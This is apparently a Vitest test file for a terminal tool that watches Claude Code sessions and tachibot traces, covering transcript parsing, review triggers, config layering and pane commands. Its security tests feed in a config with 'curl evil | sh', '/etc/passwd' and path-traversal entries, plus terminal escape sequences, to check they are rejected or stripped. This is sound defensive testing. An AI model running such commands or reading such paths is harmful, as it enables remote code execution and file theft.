import { describe, it, expect } from "vitest";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  safeAnsi,
  claudeProjectDir, claudeTranscriptPath, parseClaudeEntry, parseTraceEvent, tachibotTraceDir, toolLabel, type WatchEvent,
} from "../events.js";
import { buildReviewPrompt, parseReview, shouldReview, DEFAULT_POLICY } from "../policy.js";
import { buildOpenCommand, buildSendCommand, defaultTarget, herdrPaneId, watchArgv } from "../terminal.js";
import { findTachibot } from "../sources.js";
import { parseWatchArgs } from "../watch.js";
import { loadWatchConfig, mergeConfig, DEFAULT_CONFIG } from "../config.js";
import { parseBrainSpec } from "../brain.js";
import { memoryFiles, paragraphs, readMemoryDocs, selectSnippets } from "../memory.js";
import { EMPTY, applyEvent, stats, type CardState } from "../store.js";

const ev = (kind: WatchEvent["kind"], text = "x", ts = 1, extra: Partial<WatchEvent> = {}): WatchEvent => ({ source: "claude", kind, text, ts, ...extra });

describe("Claude transcript", () => {
  it("maps cwd to Claude's project dir", () => {
    expect(claudeProjectDir("/Users/a/WORK/TACHIBOT_ALL/tachibot-mcp")).toBe("-Users-a-WORK-TACHIBOT-ALL-tachibot-mcp");
    expect(claudeTranscriptPath("/p/q", "abc", "/h")).toBe("/h/.claude/projects/-p-q/abc.jsonl");
  });

  it("parses prompts, tool calls with ids, and results; skips injected turns and thinking", () => {
    const ts = "2026-10-30T20:00:00.000Z";
    expect(parseClaudeEntry({ type: "user", timestamp: ts, message: { content: "fix the bug" } })).toEqual([
      { source: "claude", kind: "prompt", text: "fix the bug", ts: Date.parse(ts) },
    ]);
    expect(parseClaudeEntry({ type: "user", message: { content: "<system-reminder>x</system-reminder>" } })).toEqual([]);
    const a = parseClaudeEntry({
      type: "assistant",
      message: { content: [
        { type: "thinking", thinking: "hmm" },
        { type: "text", text: "Running tests" },
        { type: "tool_use", id: "tu1", name: "Bash", input: { command: "npm test", description: "Run tests" } },
        { type: "tool_use", id: "tu2", name: "mcp__tachibot-mcp__jury", input: { question: "safe?" } },
      ] },
    });
    expect(a.map((e) => `${e.kind}:${e.text}`)).toEqual(["text:Running tests", "tool:Bash: npm test", "tool:tachibot-mcp · jury: safe?"]);
    expect(a[1]).toMatchObject({ id: "tu1", input: "npm test", tool: "Bash" });
    expect(a[2]).toMatchObject({ id: "tu2", via: "tachibot", tool: "jury" });
    const r = parseClaudeEntry({
      type: "user",
      message: { content: [
        { type: "tool_result", tool_use_id: "tu1", is_error: true, content: [{ type: "text", text: "Exit code 1" }] },
        { type: "tool_result", tool_use_id: "tu2", content: "verdict: yes" },
      ] },
    });
    expect(r.map((e) => `${e.kind}:${e.id}:${e.output}`)).toEqual(["tool-error:tu1:Exit code 1", "tool-ok:tu2:verdict: yes"]);
    expect(parseClaudeEntry({ type: "attachment" })).toEqual([]);
    expect(parseClaudeEntry(null)).toEqual([]);
    expect(toolLabel("Read")).toBe("Read");
  });
});

describe("styled output", () => {
  it("keeps colors but strips cursor moves and titles", () => {
    const raw = "\x1b]0;evil title\x07\x1b[2J\x1b[1;31mRED\x1b[0m\x1b[10A ok\r\n\n\n\nend";
    expect(safeAnsi(raw)).toBe("\x1b[1;31mRED\x1b[0m ok\n\nend");
  });
});

describe("tachibot trace", () => {
  it("keeps starts (running cards) and outcomes, ids namespaced", () => {
    expect(parseTraceEvent({ type: "span.start", id: "1", kind: "tool", name: "jury", ts: 1, input: "q" })).toMatchObject({ kind: "span", id: "tb:1", input: "q" });
    expect(parseTraceEvent({ type: "span.end", id: "2", parentId: "1", kind: "model", name: "grok:4.7", ts: 1, ms: 2000, output: "yes" }))
      .toMatchObject({ kind: "model", id: "tb:2", parentId: "tb:1", output: "yes", text: "model grok:4.7 2.0s" });
    expect(parseTraceEvent({ type: "span.end", id: "1", kind: "model", name: "deepseek", ts: 1, error: "429" })?.kind).toBe("model-error");
    expect(parseTraceEvent({ type: "span.end", id: "1", kind: "model", name: "openai:astra", ts: 1, degradedTo: "gpt-6.1-sol" })?.kind).toBe("fallback");
    expect(parseTraceEvent({ type: "thought", id: "t", name: "thought 1", ts: 1, thoughtNumber: 1, model: "gemini", input: "why" })?.text).toBe("#1 (gemini) why");
  });

  it("finds tachibot's registry where tachibot writes it", () => {
    expect(tachibotTraceDir({}, "darwin", "/h")).toBe("/h/Library/Application Support/tachibot/trace");
    expect(tachibotTraceDir({}, "linux", "/h")).toBe("/h/.local/share/tachibot/trace");
    expect(tachibotTraceDir({ XDG_DATA_HOME: "/x" }, "linux", "/h")).toBe("/x/tachibot/trace");
    expect(tachibotTraceDir({ TACHI_WATCH_TRACE_DIR: "/o" }, "darwin", "/h")).toBe("/o");
  });

  it("prefers a live tachibot in the same project, skips dead ones", () => {
    const dir = mkdtempSync(join(tmpdir(), "watch-reg-"));
    const w = (name: string, pid: number, cwd: string, startedAt: number) =>
      writeFileSync(join(dir, `${name}.json`), JSON.stringify({ pid, port: 1, token: "t", cwd, startedAt }));
    w("a", process.pid, "/other", 9);
    w("b", process.pid, "/proj", 1);
    w("c", 999_999, "/proj", 99);
    expect(findTachibot("/proj", dir)?.cwd).toBe("/proj");
    expect(findTachibot("/nowhere", dir)?.cwd).toBe("/other");
    writeFileSync(join(dir, "d.json"), JSON.stringify({ pid: process.pid, ppid: 4242, port: 2, token: "t", cwd: "/elsewhere", startedAt: 0 }));
    expect(findTachibot("/proj", dir, 4242)?.port).toBe(2); // exact Claude match beats cwd + recency
    rmSync(dir, { recursive: true, force: true });
  });
});

describe("cards", () => {
  it("folds results into their call", () => {
    let st: CardState = EMPTY;
    st = applyEvent(st, ev("tool", "Bash: npm test", 1000, { id: "tu1", input: "npm test", tool: "Bash" }));
    expect(st.cards[0]).toMatchObject({ type: "tool", title: "Bash", status: "running", input: "npm test" });
    st = applyEvent(st, ev("tool-error", "Exit 1", 3000, { id: "tu1", output: "Exit 1", outputFull: "Exit 1\nstack" }));
    expect(st.cards).toHaveLength(1);
    expect(st.cards[0]).toMatchObject({ status: "error", output: "Exit 1", full: "Exit 1\nstack", ms: 2000 });
  });

  it("merges the trace's tool span into Claude's tachibot card and nests model calls under it", () => {
    const tb = (e: Partial<WatchEvent>): WatchEvent => ({ source: "tachibot", kind: "span", text: "", ts: 1100, ...e });
    let st: CardState = EMPTY;
    st = applyEvent(st, ev("tool", "tachibot-mcp · jury: safe?", 1000, { id: "tu9", input: "safe?", via: "tachibot", tool: "jury" }));
    st = applyEvent(st, ev("prompt", "unrelated", 1050));
    st = applyEvent(st, tb({ kind: "span", id: "tb:1", tool: "jury", spanKind: "tool", text: "tool jury" }));
    expect(st.cards).toHaveLength(2); // aliased, no duplicate
    st = applyEvent(st, tb({ kind: "span", id: "tb:2", parentId: "tb:1", tool: "grok:grok-4.7", spanKind: "model", text: "model grok:grok-4.7" }));
    st = applyEvent(st, tb({ kind: "fallback", id: "tb:2", tool: "grok:grok-4.7", text: "grok:grok-4.7 → answered by grok-4.3 3.0s", ms: 3000 }));
    // the model card sits right under its tachibot card, before the later prompt
    expect(st.cards.map((c) => c.title)).toEqual(["tachibot · jury", "grok:grok-4.7", "you"]);
    expect(st.cards[1]).toMatchObject({ depth: 1, status: "fallback", cite: "grok-4.3" });
    st = applyEvent(st, tb({ kind: "model", id: "tb:1", tool: "jury", spanKind: "tool", text: "tool jury 4.0s", ms: 4000 }));
    st = applyEvent(st, ev("tool-ok", "verdict", 5000, { id: "tu9", output: "verdict: yes", outputFull: "verdict: yes\n2/3 jurors" }));
    expect(st.cards[0]).toMatchObject({ status: "ok", full: "verdict: yes\n2/3 jurors" });
    expect(stats(st.cards)).toMatchObject({ tools: 0, tachibot: 1, models: 1, fallbacks: 1 });
  });

  it("fills a backgrounded call with the result from its later task notification", () => {
    let st: CardState = EMPTY;
    st = applyEvent(st, ev("tool", "tachibot-mcp · grok_search: q", 1000, { id: "tu5", via: "tachibot", tool: "grok_search" }));
    const [bg] = parseClaudeEntry({ type: "user", message: { content: [{ type: "tool_result", tool_use_id: "tu5", content: [{ type: "text", text: 'MCP tool "tachibot-mcp/grok_search" was moved to the background as task k3cq79w7q so that…' }] }] } });
    expect(bg).toMatchObject({ kind: "tool-bg", id: "tu5", taskId: "k3cq79w7q" });
    st = applyEvent(st, bg);
    expect(st.cards[0]).toMatchObject({ status: "running", taskId: "k3cq79w7q" });
    const [done] = parseClaudeEntry({
      type: "queue-operation", operation: "enqueue", timestamp: "1970-01-01T00:00:31.000Z",
      content: "<task-notification>\n<task-id>k3cq79w7q</task-id>\n<status>completed</status>\n<summary>done</summary>\n<result>\n\u001b[1mKEPT\u001b[0m in the loop\n</result>\n</task-notification>",
    });
    expect(done).toMatchObject({ kind: "tool-ok", taskId: "k3cq79w7q", outputFull: "KEPT in the loop" });
    st = applyEvent(st, done);
    expect(st.cards[0]).toMatchObject({ status: "ok", full: "KEPT in the loop", ms: 30_000 });
    expect(parseClaudeEntry({ type: "queue-operation", operation: "remove", content: "<task-notification>…" })).toEqual([]);
  });

  it("ignores results of calls from before the backfill window and caps the list", () => {
    expect(applyEvent(EMPTY, ev("tool-ok", "x", 1, { id: "gone" }))).toEqual(EMPTY);
    expect(applyEvent(EMPTY, ev("tool-error", "x", 1, { id: "gone" }))).toEqual(EMPTY);
    let st: CardState = EMPTY;
    for (let i = 0; i < 5; i++) st = applyEvent(st, ev("prompt", `p${i}`), 3);
    expect(st.cards.map((c) => c.output)).toEqual(["p2", "p3", "p4"]);
  });
});

describe("review policy", () => {
  const long = DEFAULT_POLICY.minIntervalMs + 1;

  it("never reviews with nothing new or too soon", () => {
    expect(shouldReview([], [], long)).toBeUndefined();
    expect(shouldReview([ev("tool-error")], [], 10)).toBeUndefined();
  });

  it("reviews on errors, fallbacks, loops and cadence", () => {
    expect(shouldReview([ev("tool-error")], [], long)).toBe("error");
    expect(shouldReview([{ ...ev("model-error"), source: "tachibot" }], [], long)).toBe("error");
    expect(shouldReview([{ ...ev("fallback"), source: "tachibot" }], [], long)).toBe("fallback");
    const same = ev("tool", "Bash: npm test");
    expect(shouldReview([same], [same, same, same], long)).toBe("repeat");
    const many = Array.from({ length: 8 }, (_, i) => ev("tool", `Read: f${i}`));
    expect(shouldReview(many, many, long)).toBe("cadence");
    expect(shouldReview(many.slice(0, 3), many.slice(0, 3), long)).toBeUndefined();
  });

  it("puts trigger, cited memory, dokoro and log in the prompt", () => {
    const p = buildReviewPrompt(
      "error",
      [ev("tool-error", "Exit code 1", Date.parse("2026-10-30T20:01:02Z"))],
      [{ source: "CLAUDE.md:42", text: "never pin a model version in tool descriptions" }],
      "decided: no OpenUI in the terminal",
    );
    expect(p).toContain("Review trigger: error");
    expect(p).toContain("[CLAUDE.md:42]\nnever pin a model version");
    expect(p).toContain("dokoro recall:\ndecided: no OpenUI");
    expect(p).toContain("20:01:02 [claude/tool-error] Exit code 1");
  });

  it("parses notes with sources and at most one flag, leniently", () => {
    expect(parseReview("OK")).toEqual({ notes: [] });
    expect(parseReview(
      "Some chatter\n- **NOTE:** CLAUDE.md:42 | says no model versions — Claude wrote gpt-6-astra\nNOTE: user | asked for terminal UI\n**FLAG:** Check the tool description.\nIt pins a version.\nOK",
    )).toEqual({
      notes: [
        { source: "CLAUDE.md:42", text: "says no model versions — Claude wrote gpt-6-astra" },
        { source: "user", text: "asked for terminal UI" },
      ],
      flag: "Check the tool description. It pins a version.",
    });
    expect(parseReview("NOTE: no pipe here")).toEqual({ notes: [{ source: "watch", text: "no pipe here" }] });
    expect(parseReview("FLAG: a\nFLAG: b").flag).toBe("a");
  });
});

describe("memory excerpts", () => {
  it("splits paragraphs with line numbers and picks the overlapping ones", () => {
    const doc = { label: "CLAUDE.md", content: "# Title\n\nTool descriptions name provider and task,\nnever a pinned model version.\n\n## Other\nUnrelated gardening advice here." };
    expect(paragraphs(doc).map((p) => p.line)).toEqual([1, 3, 6]); // a heading stays with its text
    const snips = selectSnippets([doc], "Claude edited tool description to pin model version gpt-6", 3);
    expect(snips).toEqual([{ source: "CLAUDE.md:3", text: "Tool descriptions name provider and task,\nnever a pinned model version." }]);
    expect(selectSnippets([doc], "", 3)).toEqual([]);
  });

  it("collects CLAUDE.md, auto-memory and extra files that exist", () => {
    const root = mkdtempSync(join(tmpdir(), "watch-mem-"));
    const home = join(root, "home");
    const cwd = join(root, "proj");
    mkdirSync(join(home, ".claude", "projects", claudeProjectDir(cwd), "memory"), { recursive: true });
    mkdirSync(cwd, { recursive: true });
    writeFileSync(join(cwd, "CLAUDE.md"), "x");
    writeFileSync(join(home, ".claude", "projects", claudeProjectDir(cwd), "memory", "feedback.md"), "y");
    writeFileSync(join(cwd, "DECISIONS.md"), "z");
    const docs = readMemoryDocs(memoryFiles(cwd, ["DECISIONS.md"], home), cwd);
    expect(docs.map((d) => d.label).sort()).toEqual(["CLAUDE.md", "DECISIONS.md", "memory/feedback.md"]);
    rmSync(root, { recursive: true, force: true });
  });
});

describe("config + brain", () => {
  it("layers home → project → env and ignores bad values", () => {
    const root = mkdtempSync(join(tmpdir(), "watch-cfg-"));
    mkdirSync(join(root, "home", ".tachi"), { recursive: true });
    mkdirSync(join(root, "proj", ".tachi"), { recursive: true });
    writeFileSync(join(root, "home", ".tachi", "watch.json"), JSON.stringify({ brain: "codex", review: { minIntervalSec: 60 }, memory: { files: ["A.md"] } }));
    writeFileSync(join(root, "proj", ".tachi", "watch.json"), JSON.stringify({ review: { everyToolCalls: -1, repeatThreshold: 2 }, memory: { files: ["B.md"] } }));
    const cfg = loadWatchConfig(join(root, "proj"), {}, join(root, "home"));
    expect(cfg.brain).toBe("codex");
    expect(cfg.review).toEqual({ everyToolCalls: 8, minIntervalMs: 60_000, repeatThreshold: 2 });
    expect(cfg.memory.files).toEqual(["A.md", "B.md"]);
    expect(loadWatchConfig(join(root, "proj"), { TACHI_WATCH_BRAIN: "gemini" }, join(root, "home")).brain).toBe("gemini");
    expect(mergeConfig(DEFAULT_CONFIG, { brain: 42 }, "x").brain).toBe("codex");
    rmSync(root, { recursive: true, force: true });
  });

  it("parses brain specs", () => {
    expect(parseBrainSpec("claude")).toEqual({ kind: "cli", agent: "claude", model: "haiku" });
    expect(parseBrainSpec("claude:sonnet")).toEqual({ kind: "cli", agent: "claude", model: "sonnet" });
    expect(parseBrainSpec("codex")).toEqual({ kind: "cli", agent: "codex", model: undefined });
    expect(parseBrainSpec("driver:ollama")).toEqual({ kind: "driver", name: "ollama" });
    expect(parseBrainSpec("gemini:gemini-3.8-flash")).toEqual({ kind: "cli", agent: "gemini", model: "gemini-3.8-flash" });
    expect(() => parseBrainSpec("hal9000")).toThrow(/unknown brain/);
  });
});

describe("terminal plumbing", () => {
  const argv = watchArgv("/node", "/cli.js", { session: "s1", cwd: "/my proj", target: "surface:5" });

  it("opens a cmux split next to the caller pane", () => {
    const plan = buildOpenCommand(argv, { CMUX_SURFACE_ID: "S", CMUX_BUNDLED_CLI_PATH: "/A/cmux" });
    expect(plan).toEqual({
      kind: "cmux",
      command: { cmd: "/A/cmux", args: ["new-split", "right", "--surface", "S", "--command", "exec /node /cli.js watch --session s1 --cwd '/my proj' --target surface:5", "--focus", "false"] },
    });
  });

  it("uses tmux / wezterm, else prints a command to run by hand", () => {
    expect(buildOpenCommand(argv, { TMUX: "x" }).kind).toBe("tmux");
    expect(buildOpenCommand(argv, { WEZTERM_PANE: "2" }).kind).toBe("wezterm");
    expect(buildOpenCommand(argv, {})).toEqual({ kind: "manual", shell: "/node /cli.js watch --session s1 --cwd '/my proj' --target surface:5" });
  });

  it("opens a herdr split in two steps and messages Claude via agent prompt", () => {
    const env = { HERDR_ENV: "1", HERDR_PANE_ID: "w1:p2", CMUX_SURFACE_ID: "ignored" };
    const plan = buildOpenCommand(argv, env);
    if (plan.kind !== "herdr") throw new Error(plan.kind);
    expect(plan.split.args).toEqual(["pane", "split", "--current", "--direction", "right", "--cwd", "/my proj", "--no-focus"]);
    expect(plan.run("w1:p3").args).toEqual(["pane", "run", "w1:p3", "exec /node /cli.js watch --session s1 --cwd '/my proj' --target surface:5"]);
    expect(herdrPaneId('{"result":{"pane":{"pane_id":"w1:p3"}}}')).toBe("w1:p3");
    expect(herdrPaneId("garbage")).toBeUndefined();
    expect(defaultTarget(env)).toBe("herdr:w1:p2");
    expect(defaultTarget({ CMUX_SURFACE_ID: "S" })).toBe("S");
    expect(buildSendCommand("herdr:w1:p2", "check it", {})).toEqual({ cmd: "herdr", args: ["agent", "prompt", "w1:p2", "[tachi-watch] check it"] });
  });

  it("sends through cmux agent message only with a target", () => {
    expect(buildSendCommand("surface:5", "check the 429", {})).toEqual({
      cmd: "cmux", args: ["agent", "message", "surface:5", "--from", "tachi-watch", "--json", "--", "check the 429"],
    });
    expect(buildSendCommand(undefined, "x", {})).toBeUndefined();
  });

  it("parses watch args with the Claude session from env", () => {
    expect(parseWatchArgs(["--open"], { CLAUDE_CODE_SESSION_ID: "abc" })).toMatchObject({ open: true, session: "abc" });
    expect(parseWatchArgs(["--session", "x", "--target", "surface:1", "--cwd", "/p", "--brain", "codex", "--claude-pid", "77"], {}))
      .toEqual({ open: false, session: "x", target: "surface:1", cwd: "/p", brain: "codex", claudePid: 77 });
  });
});

describe("cmux receipt", () => {
  it("reads a message's delivery state from the inbox", async () => {
    const { parseInbox, buildInboxCommand } = await import("../terminal.js");
    const json = JSON.stringify({ messages: [{ id: "m1", state: "delivered", delivered_via: "claude.prompt-submit" }] });
    expect(parseInbox(json, "m1")).toEqual({ state: "delivered", via: "claude.prompt-submit" });
    expect(parseInbox(json, "nope")).toBeUndefined();
    expect(buildInboxCommand("herdr:p1", {})).toBeUndefined();
    expect(buildInboxCommand("S1", {})?.args).toEqual(["agent", "inbox", "--surface", "S1", "--json"]);
  });
});

describe("pasted text", () => {
  it("cleans \\r line ends and control bytes before sending", async () => {
    const { buildSendCommand, cleanText } = await import("../terminal.js");
    expect(cleanText("a\r\nb\rc\x1b[31m red\x1b[0m\x07 ok")).toBe("a\nb\nc red ok");
    expect(buildSendCommand("S1", "x\ry", {})?.args.at(-1)).toBe("x\ny");
  });
});

describe("safeAnsi repair", () => {
  it("repairs an SGR that lost its '['", async () => {
    const { safeAnsi } = await import("../events.js");
    expect(safeAnsi("\x1b1mCodex CLI\x1b[0m")).toBe("\x1b[1mCodex CLI\x1b[0m");
  });
});

describe("failures returned as text", () => {
  it("marks a tachibot call whose whole output is a timeout banner as an error", async () => {
    const { applyEvent, EMPTY } = await import("../store.js");
    let st = applyEvent(EMPTY, { kind: "tool", source: "claude", ts: 1, id: "t1", text: "grok_reason", via: "tachibot", tool: "grok_reason" } as never);
    st = applyEvent(st, { kind: "tool-ok", source: "claude", ts: 2, id: "t1", text: "ok", outputFull: " grok  grok_reason \n\n[Grok timeout: grok-4.7 exceeded 180s limit]" } as never);
    expect(st.cards[0].status).toBe("error");
    st = applyEvent(st, { kind: "tool", source: "claude", ts: 3, id: "t2", text: "x", via: "tachibot", tool: "grok_search" } as never);
    st = applyEvent(st, { kind: "tool-ok", source: "claude", ts: 4, id: "t2", text: "ok", outputFull: "A long answer that mentions a timeout error in passing but is a real answer." } as never);
    expect(st.cards[1].status).toBe("ok");
  });
});

describe("security hardening", () => {
  it("a project config cannot set dokoroCmd or point memory files outside the repo", async () => {
    const { mergeConfig, DEFAULT_CONFIG } = await import("../config.js");
    const c = mergeConfig(DEFAULT_CONFIG, { memory: { dokoroCmd: "curl evil | sh", files: ["/etc/passwd", "../x.md", "docs/ok.md"] } } as never, "repo", false);
    expect(c.memory.dokoroCmd).toBeUndefined();
    expect(c.memory.files).toEqual(["docs/ok.md"]);
    const home = mergeConfig(DEFAULT_CONFIG, { memory: { dokoroCmd: "node dokoro.js" } } as never, "home", true);
    expect(home.memory.dokoroCmd).toBe("node dokoro.js");
  });

  it("strips terminal control sequences from tool output and markdown", async () => {
    const { safeAnsi } = await import("../events.js");
    const { renderMarkdown, link } = await import("../md.js");
    expect(safeAnsi("ok\x1b[1mbold\x1b[22m \x1b]0;title\x07 \x1bPdcs \x9b31m")).toBe("ok\x1b[1mbold\x1b[22m  Pdcs 31m");
    expect(renderMarkdown("hi \x1b]8;;evil\x07x", 40).join("")).not.toMatch(/\x1b\]8;;evil/);
    expect(link("t", "https://a.dev/\x1bx")).toBe("t");
  });
});

describe("proposal hygiene", () => {
  it("strips escapes, controls and bidi/zero-width chars, and caps the length", async () => {
    const { cleanProposal, PROPOSAL_MAX } = await import("../watch.js");
    expect(cleanProposal("run \x1b[8mhidden\x1b[0m tests‮​\x07")).toBe("run hidden tests");
    expect(cleanProposal("x".repeat(PROPOSAL_MAX + 50)).length).toBe(PROPOSAL_MAX);
  });
});

describe("token usage", () => {
  it("a usage trace event adds tokens to its model call; the header sums them", async () => {
    const { parseTraceEvent } = await import("../events.js");
    const { applyEvent } = await import("../store.js");
    const { tokenTags } = await import("../ui.js");
    let st = { cards: [], alias: {} } as never as ReturnType<typeof applyEvent>;
    for (const raw of [
      { type: "span.start", id: "s1", kind: "tool", name: "jury", ts: 1 },
      { type: "span.start", id: "s2", parentId: "s1", kind: "model", name: "openai:gpt-6.1-sol", ts: 2 },
      { type: "usage", id: "u1", parentId: "s2", name: "usage", ts: 3, tokensIn: 12400, tokensOut: 3100, tokensReasoning: 800 },
      { type: "span.end", id: "s2", parentId: "s1", kind: "model", name: "openai:gpt-6.1-sol", ts: 4, ms: 2, output: "ok" },
    ] as never[]) {
      const e = parseTraceEvent(raw);
      if (e) st = applyEvent(st, e, 100);
    }
    const model = st.cards.find((c) => c.key === "tb:s2")!;
    expect(model.tokensIn).toBe(12400);
    expect(tokenTags({ call: st.cards[0], models: [model], notes: [] } as never)[0].label).toBe("in 12k · out 3.1k · think 800");
  });
});
